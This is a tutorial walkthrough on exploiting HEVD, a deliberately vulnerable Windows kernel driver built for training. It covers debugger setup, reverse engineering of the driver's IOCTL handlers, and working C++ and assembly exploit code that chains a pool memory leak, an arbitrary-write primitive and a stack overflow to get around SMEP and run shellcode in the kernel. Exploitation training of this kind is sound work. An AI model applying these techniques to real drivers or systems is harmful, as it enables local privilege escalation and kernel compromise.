# HackSys Extreme Vulnerable Driver

## Intro

HackSys Extreme Vulnerable Driver (HEVD) is a deliberately vulnerable Windows kernel driver intended to help researchers  and enthusiasts learn Windows kernel-level exploitation.
In this write-up, we'll go over the process of analyzing and exploiting this driver, assuming no prior experience with Windows kernel exploitation and no source-code access (in order to more closely resemble the process of exploiting a closed-source, third-party driver).
We'll go over the process of setting up a testing environment, and implement an exploit that takes advantage of some of the vulnerabilities implemented in the driver to achieve local privilege escalation.

## Setup

First off, let's go over a high-level overview of how to [set up kernel debugging of a Windows VM](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-network-debugging-of-a-virtual-machine-host).
As this process is documented in details in MS's documentation, we'll only go over the most important steps, referencing the documentation as needed.

> It is important to note that these steps need to be followed inside a Windows host.
For the purposes of this walkthrough, a 64-bit Windows 11 host was used.

### Install Debugging Tools on Host

As a first step, we have to install [Debugging Tools for Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools).

### Enable Hyper-V

Now we have to [enable Hyper-V on Windows](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v).
For this we can just run `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All` inside of a Powershell console running as administrator and then reboot.

### Set Up Target VM

#### Create the VM

Once Hyper-V is working, we need to [create a Gen 2 VM](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/quick-create-virtual-machine) and install Windows on it.

> Once again, in this walkthrough we assume a 64-bit Windows 11 target.

Within the Switch Manager in Hyper-V, we need to create an external virtual network switch.
The default options should for the switch be fine (if in doubt, refer to step two of [this guide](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-network-debugging-of-a-virtual-machine-host)).

We now have to make sure secure boot is disabled for the VM.

#### Set Up Kernel Debugging for the VM

Once the target OS is installed, we need to copy the files `kdnet.exe` and `VerifiedNICList.xml` (located in `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64`) to the VM ([the docs suggest](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-network-debugging-of-a-virtual-machine-host#setting-up-the-vm-target-computer) we copy this to a new folder named `C:\KDNET`).
Within the VM, we need to change directories to the newly created `C:\KDNET`, and run `kdnet <YourHostIPAddress> <YourDebugPort>` (the debug port can be chosen arbitrarily within the range 50000-50039).

> You can find out the host IP address of the external virtual switch by running `ipconfig` on your host machine and looking for the `IPv4 Address` entry under the section for the virtual switch you created.

The above command should return something like:

```
Enabling network debugging on Microsoft Hypervisor Virtual Machine.
Key=<SomeKey>

To debug this vm, run the following command on your debugger host machine.
windbg -k net:port=<YourDebugPort>,key=<SomeKey>

Then restart this VM by running shutdown -r -t 0 from this command prompt.
```

As suggested, we run the above command from our host (remember to use the 64-bit version of `WinDbg`, located in `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64`).
After running this, the debugger will output some text, ending with something like:

```
[...]

Using NET for debugging
Opened WinSock 2.0
Waiting to reconnect...
```

Finally, we restart the VM and, after some time, the debugger outputs:

```
[...]
Kernel Debugger connection established
[...]
```

And we are now able to debug the VM!

> The official docs recommend we re-enable Secure Boot on the VM at this point, though this is not required.

#### Build and Install the HEVD Driver

As suggested in [HEVD's readme](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver?tab=readme-ov-file#building-the-driver), we need to install [Visual Studio](https://visualstudio.microsoft.com/) (Community version will do), and the [Windows Driver Kit](https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk).

> The readme recommends Visual Studio 2017, but as of the time of writing only version 2022 was accessible from MS's website.

Now we just need to download the latest release of HEVD, move to the `[Repo]\Builder\` directory and run `Build_HEVD_Vulnerable_x64.bat`.
This will create a file named `HEVD.sys` inside of the `[Repo]\build\driver\vulnerable\x64\` directory.

The readme also suggests we use [OSRLoader](https://www.osronline.com/article.cfm%5earticle=157.htm) to load the driver we've just built.
For this, we need to run `osrloaderv30\Projects\OsrLoader\kit\WNET\AMD64\FRE\OSRLOEADER.exe`, select the `HEVD.sys` file as the `Driver Path`, and click `Register Service` and `Start Service`.
If we get `The operation completed successfully`, it means the driver was loaded correctly.

With kernel debugging set-up and the driver installed, we can move on to analyzing the driver.

## Initial Analysis

From the project's description we know that HEVD is supposed to implement an assortment of vulnerabilities, but without any prior Windows kernel exploitation experience we wouldn't even know how to interact with the driver to trigger those vulnerabilities.
So let's start with some static analysis to see if we can figure out how we can trigger driver functionality from userland.

### Interacting with the Driver

Since the `HEVD.sys` file is a Portable Executable like any other, we should have no problem loading it into [Ghidra](https://ghidra-sre.org/) (here we use version 11.2.1).
Moreover, after analyzing it using Ghidra's defaults, we see what the entry point looks like:

```C++
void entry(longlong param_1)

{
  __security_init_cookie();
  FUN_14008a000(param_1);
  return;
}
```

Now, according to [MS's guide on driver writing](https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver#write-your-first-driver-code), the entry point should be a function with the following signature:

```C++
NTSTATUS DriverEntry(
  _In_ PDRIVER_OBJECT  DriverObject,
  _In_ PUNICODE_STRING RegistryPath
);
```

So we can assume that `FUN_14008a000` is actually `DriverEntry` and edit/create type for its parameters information accordingly.
We can see the definition of the structure `DRIVER_OBJECT` on [MS's documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object), it is defined as:

```C++
typedef struct _DRIVER_OBJECT {
  CSHORT             Type;
  CSHORT             Size;
  PDEVICE_OBJECT     DeviceObject;
  ULONG              Flags;
  PVOID              DriverStart;
  ULONG              DriverSize;
  PVOID              DriverSection;
  PDRIVER_EXTENSION  DriverExtension;
  UNICODE_STRING     DriverName;
  PUNICODE_STRING    HardwareDatabase;
  PFAST_IO_DISPATCH  FastIoDispatch;
  PDRIVER_INITIALIZE DriverInit;
  PDRIVER_STARTIO    DriverStartIo;
  PDRIVER_UNLOAD     DriverUnload;
  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;
```

So we can just copy that structure to Ghidra (look out for member alignment!), and the decompiled pseudo-code should be easier to follow.

After applying relevant type information and some variable renames, we can see that the entry function starts with:

```C++
  RtlInitUnicodeString(deviceString,L"\\Device\\HackSysExtremeVulnerableDriver");
  RtlInitUnicodeString(&dosDevicesString,L"\\DosDevices\\HackSysExtremeVulnerableDriver");
  status = IoCreateDevice(DriverObject,0,deviceString,0x22,0x100,0,deviceObject);
```

Judging from [the documentation for `IoCreateDevice`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice) (and some web searching), it'd seem like this call is creating a device with the [NT device name](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/nt-device-names) `HackSysExtremeVulnerableDriver`, of type `FILE_DEVICE_UNKNOWN`, with characteristic `FILE_DEVICE_SECURE_OPEN`.

In order to make sure we're on track before proceeding with static analysis, let's try to interact with this device from userland.
We can start working on this by creating a C++ command line application project in Visual Studio.

So far, the only thing we know is the device name, so let's try to open it!
According to the documentation on [Named Device Objects](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/named-device-objects) and [Namespaces](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#win32-device-namespaces), we should be able to open the device by calling `CreateFileA`.
So we can start with a simple program that just attempts to open the device:

```C++
int main()
{
    HANDLE hevdDevice = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",    // lpFileName
        FILE_SHARE_READ | FILE_SHARE_WRITE,         // dwDesiredAccess
        0,                                          // dwShareMode
        NULL,                                       // lpSecurityAttributes
        OPEN_EXISTING,                              // dwCreationDisposition
        0,                                          // dwFlagsAndAttributes
        NULL                                        // hTemplateFile
    );

    if (hevdDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening device!\n");
        return -1;
    }
    else {
        printf("Device driver handle is %p\n", hevdDevice);
        CloseHandle(hevdDevice);
    }
    return 0;
}
```

And if we run this we get:

```
Device driver handle is 00000000000000E0
```

This means that we're on track, and we'll probably use this handle from now on to trigger any vulnerabilities we find.

#### I/O Control Handlers

Back to Ghidra, we can see that the following code runs immediately after the device is created:

```C++
    driverMajorFunction = DriverObject->MajorFunction;
    for (lVar1 = 0x1c; lVar1 != 0; lVar1 = lVar1 + -1) {
      *driverMajorFunction = FUN_140085748;
      driverMajorFunction = driverMajorFunction + 1;
    }
    DriverObject->MajorFunction[0] = &LAB_140085054;
    DriverObject->MajorFunction[2] = &LAB_140085054;
    DriverObject->MajorFunction[0xe] = &LAB_140085074;
```

This is setting up a dispatch table for [IRP function codes](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-major-function-codes) `IRP_MJ_CREATE`, `IRP_MJ_CLOSE` and `IRP_MJ_DEVICE_CONTROL`, respectively.
Unfortunately, Ghidra did not recognize some of these functions, so we can create them manually and assign them more descriptive names.
The function that we're particularly interested in is the last one, since it will handle [IOCTL requests](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control).

If we take a look at the first few lines of the function at `LAB_140085074` (which we defined as `DispatchDeviceControl`) we can see that it does indeed seem to be handling IOCTL requests:

```C++
  lVar2 = *(longlong *)(param_2 + 0xb8);
  uVar3 = 0xc00000bb;
  if (lVar2 == 0) goto LAB_140085717;
  uVar1 = *(uint *)(lVar2 + 0x18);
  if (uVar1 < 0x22203c) {
    if (uVar1 == 0x22203b) {
      DbgPrintEx(0x4d,3,"****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n");
      uVar3 = thunk_FUN_140086954();
      pcVar7 = "****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n";
    }
```

However, without type information it's quite hard to understand what is going on in depth.
Furthermore, defining the required types is also problematic since we'd need to add a lot of types to Ghidra, many of with are `union`s.

Let's zoom out for a bit and look at some [sample drive code](https://github.com/microsoft/Windows-driver-samples/blob/main/general/ioctl/wdm/sys/sioctl.c#L254) which also handles IOCTLs.
In the sample code we can see the following:

```C++
    irpSp = IoGetCurrentIrpStackLocation( Irp );
    inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    [...]

    switch ( irpSp->Parameters.DeviceIoControl.IoControlCode )
```

This is interesting, because it matches the pattern we saw in the code from HEVD.
Namely, the `Irp` parameter (analogous to `param2` in the HEVD pseudo-code) gets accessed first, and then subsequent memory accesses are relative to the pointer that was retrieved from `Irp`/`param2` (for instance, the one that retrieves the IOCTL code).
If this is correct, we can assume that the value at offset 0xb8 within `Irp` is of type [`IO_STACK_LOCATION`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location), and the `Parameters` union member within it stores a `DeviceIoControl` struct.

If we now create the relevant type in Ghidra (we only need `IO_STACK_LOCATION`, assuming the `DeviceIoControl` member of the `Parameters` member is used), the decompiled code becomes more readable:

```C++
  CurrentStackLocation = *(IO_STACK_LOCATION_DeviceIoControl **)((longlong)Irp + 0xb8);
  uVar3 = 0xc00000bb;
  if (CurrentStackLocation == (IO_STACK_LOCATION_DeviceIoControl *)0x0) goto LAB_140085717;
  ioctlCode = CurrentStackLocation->Parameters_DeviceIoControl_IoControlCode;
  if (ioctlCode < 0x22203c) {
    if (ioctlCode == 0x22203b) {
      DbgPrintEx(0x4d,3,"****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n");
      uVar3 = thunk_FUN_140086954();
      pcVar4 = "****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n";
    }
```

Now we can take advantage of the debug messages and give the function associated with each IOCTL code a more descriptive name.

Speaking of debug messages, if we look at the [documentation for `DbgPrintEx`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprintex) (and the associated [guide on debug messages](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/reading-and-filtering-debugging-messages)) we see that we can get debug messages in `WinDbg` by running `ed Kd_IHVDRIVER_Mask 0x8` from the command prompt.

Let's see if we can trigger the above code from our exploit.
We can update the exploit to contain the following:

```C++
int main()
{
    HANDLE hevdDevice = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",    // lpFileName
        FILE_SHARE_READ | FILE_SHARE_WRITE,         // dwDesiredAccess
        0,                                          // dwShareMode
        NULL,                                       // lpSecurityAttributes
        OPEN_EXISTING,                              // dwCreationDisposition
        0,                                          // dwFlagsAndAttributes
        NULL                                        // hTemplateFile
    );

    if (hevdDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening device!\n");
        return -1;
    }
    else {
        printf("Device driver handle is %p\n", hevdDevice);
        DeviceIoControl(
            hevdDevice,
            0x1337,
            NULL,
            0,
            NULL,
            0,
            NULL,
            NULL
        );
        CloseHandle(hevdDevice);
    }
    return 0;
}
```

From `WinDbg` we can hit `Ctrl+Break` in order to get a command prompt, set a breakpoint at the beginning of `DispatchDeviceControl` (which lies at offset 0x85074 in my build) and execute the POC:

```
2: kd> ed Kd_IHVDRIVER_Mask 0x8
2: kd> u hevd + 85074
HEVD+0x85074:
fffff806`176b5074 488bc4          mov     rax,rsp
fffff806`176b5077 48895808        mov     qword ptr [rax+8],rbx
fffff806`176b507b 48896810        mov     qword ptr [rax+10h],rbp
fffff806`176b507f 48897018        mov     qword ptr [rax+18h],rsi
fffff806`176b5083 48897820        mov     qword ptr [rax+20h],rdi
fffff806`176b5087 4156            push    r14
fffff806`176b5089 4883ec20        sub     rsp,20h
fffff806`176b508d 4c8bb2b8000000  mov     r14,qword ptr [rdx+0B8h]
2: kd> bp hevd + 85074
2: kd> g
Breakpointhit
HEVD+0x85074:
fffff806`176b5074 488bc4          mov     rax,rsp
4: kd> t
HEVD+0x85077:
fffff806`176b5077 48895808        mov     qword ptr [rax+8],rbx
4: kd> 
HEVD+0x8507b:
fffff806`176b507b 48896810        mov     qword ptr [rax+10h],rbp
4: kd> 
HEVD+0x8507f:
fffff806`176b507f 48897018        mov     qword ptr [rax+18h],rsi
4: kd> 
HEVD+0x85083:
fffff806`176b5083 48897820        mov     qword ptr [rax+20h],rdi
4: kd> 
HEVD+0x85087:
fffff806`176b5087 4156            push    r14
4: kd> 
HEVD+0x85089:
fffff806`176b5089 4883ec20        sub     rsp,20h
4: kd> 
HEVD+0x8508d:
fffff806`176b508d 4c8bb2b8000000  mov     r14,qword ptr [rdx+0B8h]
4: kd> 
HEVD+0x85094:
fffff806`176b5094 488bea          mov     rbp,rdx
4: kd> 
HEVD+0x85097:
fffff806`176b5097 bebb0000c0      mov     esi,0C00000BBh
4: kd> 
HEVD+0x8509c:
fffff806`176b509c 4d85f6          test    r14,r14
4: kd> 
HEVD+0x8509f:
fffff806`176b509f 0f8472060000    je      HEVD+0x85717 (fffff806`176b5717)
4: kd> 
HEVD+0x850a5:
fffff806`176b50a5 458b4e18        mov     r9d,dword ptr [r14+18h]
4: kd> 
HEVD+0x850a9:
fffff806`176b50a9 b83b202200      mov     eax,22203Bh
4: kd> r r9d
r9d=1337
4: kd> pt
[-] Invalid IOCTL Code: 0x1337
HEVD+0x85746:
fffff806`176b5746 c3              ret
```

> Note that the `HEVD.sys` driver gets treated as a module in kernel-mode `WinDbg`, which simplifies setting breakpoints at random offsets.

Which means that we can now hit any piece of code within this handle and from now on we can just focus on getting a working exploit.

## Exploitation

### Overview

If we go over the debug messages printed in `DispatchDeviceControl` we can get a fairly good idea of what the different vulnerabilities are.

One basic vulnerability that immediately catches the eye is stack buffer overflow (the debug messaging stating `HEVD_IOCTL_BUFFER_OVERFLOW_STACK`).
On top of it, there's a separate IOCTL whose debug message states `HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS`, which suggests that the former vulnerability does not use stack cookies (and can be thus exploited without needing to disclose the canary).
What this means is that we should be able to hijack control flow easily.

There are two problems that need to be sorted out first, though.

### SMEP Bypass

First, we don't know _where_ to hijack control flow to.
Since we are exploiting this driver from userland, even if we replaced the return address of the vulnerable function with a pointer to our (userland) code, all we'd achieve is triggering an exception and get a BSOD.
This is because recent Windows versions make use of a hardware a feature called [SMEP](https://en.wikipedia.org/wiki/Control_register#SMEP), which, when enabled, prevents the processor from executing code in user pages when running as kernel.

> In `amd64`, pages can be mapped as either user or supervisor. When SMEP is enabled (i.e., when bit 20 of the `cr4` register is set to 1) the processor will prevent us from executing code in user pages when running in current privilege level (or CPL) other than three (the CPL being indicated by the two least significant bits of the `cs` register).

If we dump the `cr4` register just as we enter the IOCTL handler we can see that SMEP is, in fact, enabled, and that the driver code gets executed with CPL 2:

```
Breakpoint 0 hit
HEVD+0x85074:
fffff804`98f05074 488bc4          mov     rax,rsp
6: kd> r cr4
cr4=0000000000b50ef8
6: kd> ? 0000000000b50ef8 & (1 << 0n20)
Evaluate expression: 1048576 = 00000000`00100000
6: kd> r cs
cs=0010
```

There are multiple ways to bypass this, we could modify the value of the `cr4` register to disable SMEP, or [flip the U/S bit of the PTE entry for our shellcode](https://www.coresecurity.com/core-labs/publications/windows-smep-bypass-us).
Yet another option is to try and copy our shellcode over to kernel space using other vulnerabilities implemented in the HEVD driver.

If we look further down the `DispatchDeviceControl` function, we see the following debug messages: `HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL` and `HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX`.
This is interesting, there are two memory disclosure vulnerabilities, one of which specifies the `_NX` suffix (which would imply that the other one leaks an address which is both writable and executable).

> Apparently a [non-paged pool](https://learn.microsoft.com/en-us/windows/win32/memory/memory-pools) is guaranteed to reside in physical memory, so we should be able to use it for the purposes of exploitation.

If we look at the IOCTL code for `HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL` we see the following (after some variable/function renaming):

```C++
    else if (ioctlCode == 0x22203f) {
      DbgPrintEx(0x4d,3,"****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******\n");
      uVar1 = memory_disclosure_non_paged_pool(Irp,CurrentStackLocation);
      status = (undefined4)uVar1;
      pcVar4 = "****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******\n";
    }
```

Furthermore:

```C++
undefined8
memory_disclosure_non_paged_pool(void *Irp,IO_STACK_LOCATION_DeviceIoControl *CurrentStackLocation)

{
  undefined8 uVar1;
  
  uVar1 = 0xc0000001;
  if (*(void **)((longlong)Irp + 0x70) != (void *)0x0) {
    uVar1 = trigger_memory_disclosure_non_paged_pool
                      (*(void **)((longlong)Irp + 0x70),
                       (ulonglong)
                       CurrentStackLocation->Parameters_DeviceIoControl_OutputBufferLength);
  }
  return uVar1;
}
```

Even without defining the `_IRP` struct, we can know that the member at offset 0x70 is UserBuffer by getting the definition from `WinDbg`:

```
0: kd> dt _IRP
ntdll!_IRP
[...]
   +0x070 UserBuffer       : Ptr64 Void
[...]
```

Good, so the first argument is the address of the output buffer, and the second one is its length.
Let's now look at the vulnerable function:

```C++
undefined8 trigger_memory_disclosure_non_paged_pool(void *userBuffer,ulonglong outputBufferLength)

{
  longlong *allocatedPool;
  undefined8 uVar1;
  
  DbgPrintEx(0x4d,3,"[+] Allocating Pool chunk\n");
  allocatedPool = (longlong *)ExAllocatePoolWithTag(0,0x1f8,0x6b636148);
  if (allocatedPool == (longlong *)0x0) {
    DbgPrintEx(0x4d,3,"[-] Unable to allocate Pool chunk\n");
    uVar1 = 0xc0000017;
  }
  else {
    DbgPrintEx(0x4d,3,"[+] Pool Tag: %s\n","\'kcaH\'");
    DbgPrintEx(0x4d,3,"[+] Pool Type: %s\n","NonPagedPool");
    DbgPrintEx(0x4d,3,"[+] Pool Size: 0x%X\n",0x1f8);
    DbgPrintEx(0x4d,3,"[+] Pool Chunk: 0x%p\n",allocatedPool);
    memset_maybe(allocatedPool,0x41,(undefined *)0x1f8);
    ProbeForWrite(userBuffer,0x1f8,1);
    DbgPrintEx(0x4d,3,"[+] UserOutputBuffer: 0x%p\n",userBuffer);
    DbgPrintEx(0x4d,3,"[+] UserOutputBuffer Size: 0x%X\n",outputBufferLength);
    DbgPrintEx(0x4d,3,"[+] KernelBuffer: 0x%p\n",allocatedPool);
    DbgPrintEx(0x4d,3,"[+] KernelBuffer Size: 0x%X\n",0x1f8);
    DbgPrintEx(0x4d,3,"[+] Triggering Memory Disclosure in NonPagedPool\n");
    memcpy_maybe(userBuffer,allocatedPool,outputBufferLength);
    DbgPrintEx(0x4d,3,"[+] Freeing Pool chunk\n");
    DbgPrintEx(0x4d,3,"[+] Pool Tag: %s\n","\'kcaH\'");
    DbgPrintEx(0x4d,3,"[+] Pool Chunk: 0x%p\n",allocatedPool);
    ExFreePoolWithTag(allocatedPool,0x6b636148);
    uVar1 = 0;
  }
  return uVar1;
}
```

> Functions `memset_maybe` and `memcpy_maybe` were thus named simply because of their arguments, without actually looking at their code.

It's clear that this function allocates 0x1f8 bytes, sets them to 0x41, and then copies a user-specified number of bytes from that buffer to the output buffer.
[According to the documentation for `ExAllocatePoolWithTag`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag), the first argument being zero ([i.e., `NonPagedPool`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type)) means that the memory will be writable as well as executable.
All of this is clearly problematic, since we have control of `outputBufferLength` and can read beyond the end of the buffer to disclose information.
It's not immediately obvious what memory we can get from here, so let's try actually triggering this vulnerability from our exploit and seeing if we can disclose anything useful:

```C++
[...]
    const uint32_t IOCTL_MEM_DISCLOSURE = 0x22203f;
    const uint32_t buffer_size = 0x400;
    uint8_t buffer[buffer_size];

    printf("Leaking non-paged pool memory address... ");

    DeviceIoControl(
        hevdDevice,
        IOCTL_MEM_DISCLOSURE,
        NULL,
        0,
        buffer,
        buffer_size,
        NULL,
        NULL
    );

    for (uint32_t i = 0; i < buffer_size; i += 8) {
        uint64_t leak = *(uint64_t*)((uint64_t)buffer + i);
        printf("Offset %p: %p\n", i, leak);
    }
[...]
```

After executing this, a debug message in `WinDbg` will tell us the address of the allocated buffer:

```
****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******
[+] Allocating Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x1F8
[+] Pool Chunk: 0xFFFF980B50B03230
[+] UserOutputBuffer: 0x000000B6CA0FE7C0
[+] UserOutputBuffer Size: 0x400
[+] KernelBuffer: 0xFFFF980B50B03230
[+] KernelBuffer Size: 0x1F8
[+] Triggering Memory Disclosure in NonPagedPool
[+] Freeing Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Chunk: 0xFFFF980B50B03230
****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******
```

And in our program output we see the following:

```
[...]
Offset 00000000000001F0: 4141414141414141
Offset 00000000000001F8: 0000022A20134880
Offset 0000000000000200: B9C2301B0D9CD959
Offset 0000000000000208: FFFF980B50B02E58
Offset 0000000000000210: FFFF980B50B03FE8
[...]
```

It's interesting to note that the qword leaked at offset 0x210 (`FFFF980B50B03FE8`) points to an address located within the same page as the allocated buffer (`FFFF980B50B03230`).
But even if we can leak the address of the buffer, the driver has already freed the buffer before we can retrieve its address (note the `ExFreePoolWithTag` call near the end of `trigger_memory_disclosure_non_paged_pool`).
We can inspect the memory after the buffer has been freed to check if it's still accessible (and executable):

```
8: kd> db FFFF980B50B03000 L8
ffff980b`50b03000  55 48 8b ec 48 83 ec 20                          UH..H.. 
8: kd> !pte FFFF980B50B03000
                                           VA ffff980b50b03000
PXE at FFFF93C9E4F27980    PPE at FFFF93C9E4F30168    PDE at FFFF93C9E602D428    PTE at FFFF93CC05A85818
contains 0A00000004437863  contains 0A0000000443A863  contains 0A0000000443F863  contains 0A00000049C53963
pfn 4437      ---DA--KWEV  pfn 443a      ---DA--KWEV  pfn 443f      ---DA--KWEV  pfn 49c53     -G-DA--KWEV
```

Nice, the memory is still accessible, it's mapped for use by supervisor code (K), writable (W) and executable (E).
The only thing left is to somehow copy our payload to that page.

> Since that page is being user for non-paged pool allocation it's likely that by overwriting it we might overwrite important allocator metadata.
For the time being, we can move forward with the exploit and take a deeper look at the allocator if we happen to find any stability issues.

Conveniently, we can see a `HEVD_IOCTL_ARBITRARY_WRITE` message inside of `DispatchDeviceControl`, so we can look into the relevant code to see how that would work:

```C++
      else if (ioctlCode == 0x22200b) {
        DbgPrintEx(0x4d,3,"****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
        uVar1 = arbitrary_write(Irp,CurrentStackLocation);
        status = (undefined4)uVar1;
        pcVar4 = "****** HEVD_IOCTL_ARBITRARY_WRITE ******\n";
      }
```

```C++
undefined8 arbitrary_write(void *Irp,IO_STACK_LOCATION_DeviceIoControl *CurrentStackLocation)

{
  undefined8 uVar1;
  
  uVar1 = 0xc0000001;
  if (CurrentStackLocation->Parameters_DeviceIoControl_Type3InputBuffer != (void *)0x0) {
    uVar1 = trigger_arbitrary_write
                      (CurrentStackLocation->Parameters_DeviceIoControl_Type3InputBuffer);
  }
  return uVar1;
}
```

```C++
undefined8 trigger_arbitrary_write(void *inputBuffer)

{
  undefined8 *what;
  undefined8 *where;
  
  ProbeForRead(inputBuffer,0x10,1);
                    /* WARNING: Load size is inaccurate */
  what = *inputBuffer;
  where = *(undefined8 **)((longlong)inputBuffer + 8);
  DbgPrintEx(0x4d,3,"[+] UserWriteWhatWhere: 0x%p\n",inputBuffer);
  DbgPrintEx(0x4d,3,"[+] WRITE_WHAT_WHERE Size: 0x%X\n",0x10);
  DbgPrintEx(0x4d,3,"[+] UserWriteWhatWhere->What: 0x%p\n",what);
  DbgPrintEx(0x4d,3,"[+] UserWriteWhatWhere->Where: 0x%p\n",where);
  DbgPrintEx(0x4d,3,"[+] Triggering Arbitrary Write\n");
  *where = *what;
  return 0;
}
```

This seems fairly straightforward, we pass the IOCTL two pointers consecutive pointers, one with the address to read from, and the other with the address to write to, and the driver copies a qword from one address to the other.

> Similarly to SMEP, there exists another mitigation, SMAP, which prevents the kernel from accessing usermode _data_.
However, [Windows doesn't seem to support this feature as of the time of writing](https://youtu.be/-3jxVIFGuQw?t=1578) since enabling this would break many existing drivers (though it will be implemented at some point in the future).

We can leverage this IOCTL to copy code to a known kernel address, and exploit the aforementioned stack buffer overflow to jump to this buffer without violating SMEP.
So let's begin drafting some kernel payload.

Since we're going to have to do some low-level things within our payload (on top of ensuring our code is position independent and does not attempt to jump to usercode all the while), it's easiest to develop it entirely in assembly (so we'll need to [add an assembly source file to our Visual Studio project](https://stackoverflow.com/a/33757749)).
Not only this, but we're also going to need to retrieve the virtual address of the payload (which is not trivial given that we've been working on uses C++).
Let's add an assembly file with the following contents to the project:

```Assembly
PUBLIC kernel_shellcode
PUBLIC get_kernel_shellcode_address
PUBLIC get_kernel_shellcode_size

.code

kernel_shellcode_start PROC
kernel_shellcode_start ENDP

kernel_shellcode PROC
	; Our exploit will go here
	int 3
kernel_shellcode ENDP

kernel_shellcode_end PROC
kernel_shellcode_end ENDP

get_kernel_shellcode_address PROC
	mov rax, kernel_shellcode_start
	ret
get_kernel_shellcode_address ENDP

get_kernel_shellcode_size PROC
	call get_kernel_shellcode_address
	mov rcx, rax
	mov rax, kernel_shellcode_end
	sub rax, rcx
	ret
get_kernel_shellcode_size ENDP

END
```

And within our `main.cpp` file we can access the helper functions which give us both the payload address and size:

```C++
[...]
extern "C" {
    extern uint8_t* get_kernel_shellcode_address(void);
    extern uint32_t get_kernel_shellcode_size(void);
};

int main()
{
[...]
```

Now we can leverage the write-what-where primitve to copy whatever lies inside `kernel_shellcode_start` and `kernel_shellcode_end` tags to the leaked page and execute it.
Putting all of this together the code looks as follows:

```C++
[...]
    uint8_t* non_paged_pool = 0x0;
	
    {
        const uint32_t IOCTL_MEM_DISCLOSURE = 0x22203f;
        const uint32_t buffer_size = 0x400;
        uint8_t buffer[buffer_size];
	
        printf("Leaking non-paged pool memory address... ");
	
        DeviceIoControl(
            hevdDevice,
            IOCTL_MEM_DISCLOSURE,
            NULL,
            0,
            buffer,
            buffer_size,
            NULL,
            NULL
        );
	
        uint8_t* leak_address = *(uint8_t**)((uint64_t)buffer + 0x210);
        non_paged_pool = (uint8_t*)((uint64_t)leak_address & (uint64_t)0xfffffffffffff000);
	
        printf("Done! Non paged pool at %p\n", non_paged_pool);
    }
	
    {
        const uint32_t IOCTL_WRITE_WHAT_WHERE = 0x22200b;
        uint8_t* kernel_shellcode = get_kernel_shellcode_address();
        uint32_t kernel_shellcode_size = get_kernel_shellcode_size();
	
        printf("Writing %u bytes of shellcode to non-paged pool... ", kernel_shellcode_size);
	
        for (uint32_t i = 0; i < kernel_shellcode_size; i+=8) {
            uint64_t write_what_where[2] = {
                (uint64_t)kernel_shellcode + i,
                (uint64_t)non_paged_pool + i,
            };
	
            DeviceIoControl(
                hevdDevice,
                IOCTL_WRITE_WHAT_WHERE,
                write_what_where,
                0x10,
                NULL,
                0,
                NULL,
                NULL
            );
        }
	
        printf("Done!\n");
    }

    {
        const uint32_t IOCTL_STACK_OVERFLOW = 0x222003;
        const uint32_t buffer_size = 0x828;
        uint8_t buffer[buffer_size];
	
        for (uint32_t i = 0; i < buffer_size; i+=8) {
            *(uint64_t*)((uint64_t)buffer + i) = (uint64_t)non_paged_pool;
        }
	
        printf("Triggering overflow and hijacking control flow... ");
	
        DeviceIoControl(
            hevdDevice,
            IOCTL_STACK_OVERFLOW,
            buffer,
            buffer_size,
            NULL,
            0,
            NULL,
            NULL
        );
	
        printf("Done!\n");
    }
[...]
```

